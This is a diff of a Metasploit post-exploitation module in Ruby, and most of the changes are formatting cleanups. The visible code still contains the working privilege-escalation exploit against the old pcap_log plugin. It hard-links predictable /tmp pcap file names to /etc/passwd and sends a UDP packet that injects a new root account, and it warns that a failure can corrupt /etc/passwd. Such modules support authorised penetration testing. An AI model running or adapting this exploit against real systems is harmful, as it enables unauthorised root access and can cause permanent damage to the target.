@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -14,10 +15,9 @@ class MetasploitModule < Msf::Post
 
   include Msf::Exploit::Local::Linux
 
-  def initialize(info={})
-    super( update_info( info, {
-        'Name'	  => 'Multi Escalate Metasploit pcap_log Local Privilege Escalation',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(update_info(info, 'Name'	  => 'Multi Escalate Metasploit pcap_log Local Privilege Escalation',
+                            'Description' => %q(
           Metasploit < 4.4 contains a vulnerable 'pcap_log' plugin which, when used with the default settings,
           creates pcap files in /tmp with predictable file names. This exploits this by hard-linking these
           filenames to /etc/passwd, then sending a packet with a priviliged user entry contained within.
@@ -28,37 +28,40 @@ class MetasploitModule < Msf::Post
           This module requires manual clean-up. Upon success, you should remove /tmp/msf3-session*pcap
           files and truncate /etc/passwd. Note that if this module fails, you can potentially induce
           a permanent DoS on the target by corrupting the /etc/passwd file.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'	=> [ '0a29406d9794e4f9b30b3c5d6702c708'],
-        'Platform'      => %w{ bsd linux unix },
-        'SessionTypes'  => [ 'shell', 'meterpreter' ],
-        'References'    =>
+        ),
+                            'License' => MSF_LICENSE,
+                            'Author'	=> [ '0a29406d9794e4f9b30b3c5d6702c708'],
+                            'Platform'      => %w(bsd linux unix),
+                            'SessionTypes'  => [ 'shell', 'meterpreter' ],
+                            'References'    =>
           [
             [ 'BID', '54472' ],
             [ 'URL', 'http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html'],
-            [ 'URL', 'https://community.rapid7.com/docs/DOC-1946' ],
+            [ 'URL', 'https://community.rapid7.com/docs/DOC-1946' ]
           ],
-        'DisclosureDate' => "Jul 16 2012",
-        'Targets'       =>
+                            'DisclosureDate' => "Jul 16 2012",
+                            'Targets' =>
           [
-            [ 'Linux/Unix Universal', {} ],
+            [ 'Linux/Unix Universal', {} ]
           ],
-        'Stance' => Msf::Exploit::Stance::Passive,
-        'DefaultTarget' => 0,
-      }
-      ))
-      register_options(
+                            'Stance' => Msf::Exploit::Stance::Passive,
+                            'DefaultTarget' => 0))
+    register_options(
       [
         Opt::RPORT(2940),
         OptString.new("USERNAME", [ true, "Username for the new superuser", "metasploit" ]),
         OptString.new("PASSWORD", [ true, "Password for the new superuser", "metasploit" ]),
         OptInt.new("MINUTES", [true, "Number of minutes to try to inject", 5])
-      ], self)
+      ], self
+    )
   end
 
   def normalize_minutes
-    datastore["MINUTES"].abs rescue 0
+    begin
+      datastore["MINUTES"].abs
+    rescue
+      0
+    end
   end
 
   def run
@@ -68,7 +71,7 @@ class MetasploitModule < Msf::Post
     i = 0
     j = 0
     loop do
-      if (i == 0)
+      if i == 0
         j += 1
         break if j >= datastore['MINUTES'] + 1 # Give up after X minutes
         # 0a2940: cmd_exec is slow, so send 1 command to do all the links
@@ -81,15 +84,14 @@ class MetasploitModule < Msf::Post
         pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
         vprint_status("Sending /etc/passwd file contents payload to #{session.session_host}")
         udpsock = Rex::Socket::Udp.create(
-        {
-          'Context' => {'Msf' => framework, 'MsfExploit'=>self}
-        })
+          'Context' => { 'Msf' => framework, 'MsfExploit' => self }
+        )
         res = udpsock.sendto(pkt, session.session_host, datastore['RPORT'])
       else
         break
       end
       sleep(1) # wait a second
-      i = (i+1) % 60 # increment second counter
+      i = (i + 1) % 60 # increment second counter
     end
 
     if read_file("/etc/passwd").includes?("Metasploit")
